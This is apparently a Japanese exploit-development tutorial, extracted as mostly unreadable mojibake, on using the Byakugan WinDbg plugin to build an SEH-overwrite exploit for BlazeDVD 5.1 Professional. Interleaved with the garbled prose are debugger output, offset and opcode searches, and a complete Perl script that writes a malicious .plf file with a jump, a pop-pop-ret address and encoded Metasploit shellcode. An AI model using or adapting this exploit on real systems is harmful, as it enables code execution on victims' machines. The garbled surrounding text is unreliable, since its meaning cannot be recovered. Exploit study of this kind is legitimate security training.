 ß   ¶ $   ı   .      ¡       $ Æ S X    Æ $ ¢ £  
Detoured.dll   1
2 3  l    : ;  '   c  ;   †  m             t G ; $ w x ’
byakugan jutsu  
pattern_offset 1
| \ ,    , K 
windbg   J
0:000> !load byakugan
[Byakugan] Successfully loaded!
  $  ¶  2 3  l 5    1 2
byakugan exploit BlazeDVD 5.1 Professional/Blaze HDTV Player 6.0 N
0
3  4 ; # ¶ 4 $ ) 5  ⁄ ¥ ˘ £   i   6 V  ] 7   ! " $  | \ , 
plf exploit 1 
   ⁄ ¥   \  ,     
http://www.blazevideo.com/download.htm BlazeDVD 5 Professional  1  
BlazeDVD 5.1 Professional (10.6 MB) http://www.corelan.be:8800/?dl_id=40
 8   l › ¤ 9  V  :  “ « ;  ı -   ? @  l 9  V  ] 
A payload metasploit pattern 1
] ;  blazecrash.plf
B   S  y £  2 \ ,  A C ! " #  5 ¤ D  E 8   –  o   F \ x
windbg BlazeDVD windbg  ˚   M
0
 G « =   †  $  H I  =  B   C B  –  J  4 ; K   $ 4
F5 27 BlazeDVD plf metasploit pattern  1  @
; C  ! " #   G #2 | \ ,   ø œ 
F5 1 1 N 
L
(5b0.894): Access violation(5b0.894): Access violation - code c0000005 (first chance)
- code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=77f6c19c ecx=062ddcd8 edx=00000042 esi=01f61c20 edi=6405569c
eip=37694136 esp=0012f470 ebp=01f61e60 iopl=0 nv up ei pl nz na pe nc
@  G I M t   l 9     8   \ ,    $ N 
byakugan byakugan metasploit pattern 
0
0:000> !load byakugan
[Byakugan] Successfully loaded!
0:000> !pattern_offset 1000
[Byakugan] Control of ecx at offset 612.
[Byakugan] Control of eip at offset 612.
  = y £    l  7 O ? t    5  ⁄ ¥ $ &   p T q  8 , - . 5  F 2 ]  P  m n Q R t     
˚  1
  S 7 ” h   l  y £ K  O ?  T 
!exchain  M J
0:000> !exchain
0012afe4: 0012afe4: ntdll!ExecuteHandler2+3a (7c9032bc)
ntdll!ExecuteHandler2+3a (7c9032bc)
0012f5b8: 0012f5b8: +41347540 (41347541)
+41347540 (41347541)
Invalid exception stack at 33754132
, I ø œ )  t C h $ E 8     8  , - .  * +    U 4    ] ‹ V  F G  * + E 8  
612 SEH nSEH 
 p W  H X  Y $ p W $  ’ ,  t Q R  ] S 6  K Z [ ,  \ ] $ , - .  l fi
SEH 4 byte (=608) N   @ ˚ 1
fl  ] ^ . Q R $ _ ‘  P  
SEH exploit N 
[junk][jump][pop pop ret][shellcode]
 t      l  
pop pop ret M
I a
jump 30 bytes 6 bytes  
I ,   $  b , c d  $ ; k
nop shellcode jump 30  
   | \ , fe          $ g  h F i  K $ Z %
pop pop ret findjmp !jutsu searchOpcode !jutsu searchOpcode 1 @
&   \ ,  ’ H $ j $ K i  l        
findjmp pop pop ret searchOpcode pop esi pop ebx ret  ˚ 1 
0:000> !jutsu searchOpcode pop esi | pop ebx | ret
[J] Searching for:
> pop esi
> pop ebx
> ret
[J] Machine Code:
> 5e 5b c3
[J] Executable opcode sequence found at: 0x05942a99
[J] Executable opcode sequence found at: 0x05945425
[J] Executable opcode sequence found at: 0x05946a1e
[J] Executable opcode sequence found at: 0x059686a0
[J] Executable opcode sequence found at: 0x05969d91
[J] Executable opcode sequence found at: 0x0596aaa6
[J] Executable opcode sequence found at: 0x1000467f
[J] Executable opcode sequence found at: 0x100064c7
[J] Executable opcode sequence found at: 0x10008795
[J] Executable opcode sequence found at: 0x1000aa0b
[J] Executable opcode sequence found at: 0x1000e662
[J] Executable opcode sequence found at: 0x1000e936
[J] Executable opcode sequence found at: 0x3d937a1d
[J] Executable opcode sequence found at: 0x3d93adf5
»
 $ \ ¢ £    $   k l        \ ,   K      $ \ ¢ £ 
BlazeDVD dll pop pop ret windbg "lm"  J
0
  L  †  $  H   , P m $   -  P  ª O  n  2 3  l   
XP SP3 En 0x64 0x640246f7 1  
0:000> u 0x640246f7
MediaPlayerCtrl!DllCreateObject+0x153e7:
640246f7 5e pop esi
640246f8 5b pop ebx
640246f9 c3 ret
V  l $
6
exploit:
my $sploitfile="blazesploit.plf";
my $junk = "A" x 608; #612 - 4
my $nseh = "\xeb\x1e\x90\x90"; #jump 30 bytes
my $seh = pack('V',0x640246f7); #pop esi, pop ebx, ret
my $nop = "\x90" x 30; #start with 30 nop's
# windows/exec - 302 bytes
# http://www.metasploit.com
# Encoder: x86/alpha_upper
# EXITFUNC=seh, CMD=calc
my $shellcode="\x89\xe3\xdb\xc2\xd9\x73\xf4\x59\x49\x49\x49\x49\x49\x43" .
"\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58" .
"\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42" .
"\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30" .
"\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4b\x58" .
"\x51\x54\x43\x30\x45\x50\x45\x50\x4c\x4b\x47\x35\x47\x4c" .
"\x4c\x4b\x43\x4c\x43\x35\x44\x38\x43\x31\x4a\x4f\x4c\x4b" .
"\x50\x4f\x44\x58\x4c\x4b\x51\x4f\x47\x50\x45\x51\x4a\x4b" .
"\x50\x49\x4c\x4b\x46\x54\x4c\x4b\x45\x51\x4a\x4e\x50\x31" .
"\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x44\x34\x45\x57" .
"\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4b\x44" .
"\x47\x4b\x50\x54\x47\x54\x45\x54\x43\x45\x4a\x45\x4c\x4b" .
"\x51\x4f\x46\x44\x45\x51\x4a\x4b\x45\x36\x4c\x4b\x44\x4c" .
"\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x43\x31\x4a\x4b\x4c\x4b" .
"\x45\x4c\x4c\x4b\x43\x31\x4a\x4b\x4d\x59\x51\x4c\x46\x44" .
"\x43\x34\x49\x53\x51\x4f\x46\x51\x4b\x46\x43\x50\x46\x36" .
"\x45\x34\x4c\x4b\x50\x46\x50\x30\x4c\x4b\x51\x50\x44\x4c" .
"\x4c\x4b\x42\x50\x45\x4c\x4e\x4d\x4c\x4b\x42\x48\x43\x38" .
"\x4b\x39\x4a\x58\x4d\x53\x49\x50\x43\x5a\x50\x50\x43\x58" .
"\x4c\x30\x4d\x5a\x45\x54\x51\x4f\x42\x48\x4d\x48\x4b\x4e" .
"\x4d\x5a\x44\x4e\x50\x57\x4b\x4f\x4b\x57\x43\x53\x43\x51" .
"\x42\x4c\x43\x53\x43\x30\x41\x41";
$payload =$junk.$nseh.$seh.$nop.$shellcode;
open ($FILE,">$sploitfile");
print $FILE $payload;
close($FILE);
 †  $  H I Ø  & w o
2 ] p  r  H F  o q r   \ x 2 =  l f  s y  t  , Ø  & w    2 = u v  w     B C $ x
byakugan ˇ
 ø œ  6 V  , y &   z n X 
exploit
I  l S  fi fl $ K ’  $    /  #   n o A {    †  | } $   6
pop pop ret safeseh byakugan Lurene Grenier
7 o  ~   2     ´ $    ”    | <      H 8 9 A { $  I ˘ £ 5  -   f ’ 8 9 
ASLR ˇ 1 N
$  ˙
H   A {
1
I  l S  x A O N $ H ª    o ˆ  \ , < = -  & w $  
shellcode jump 30 bytes nop   1
I O y £   ß .              l \ , K    6  =
exploit shellcode exploit N   @ ˝ 1
b     O  l -  & w  5 ¤ k   E $ # 
N N 1
Byakugan : memDiff
  l     ⁄ ¥ ? p ’   6 $ 8 9 w x 2 3  l   *  $   5  a
exploit byakugan exploit jump(0xeb,0x1e) 1
%   ]   $ K  2 ƒ  .   U m } * &  $   ”  ,         
(0xcc,0xcc) shellcode shellcode shellcode 
, ’ \ x &  $  l 9  * &  $ } U m * f     t     $ w x   l 5 ¤ 
bad characters shellcode shellcode 1 
  ,    8   ”  9 5  ] 4  4 ;  S   p  , ; k ¯ ˘ ˙ $   0 4 ; 
shellcode shellcode ascii / 1   
my $shellcode="\x89\xe3\xdb\xc2\xd9\x73\xf4\x59\x49\x49\x49\x49\x49\x43" .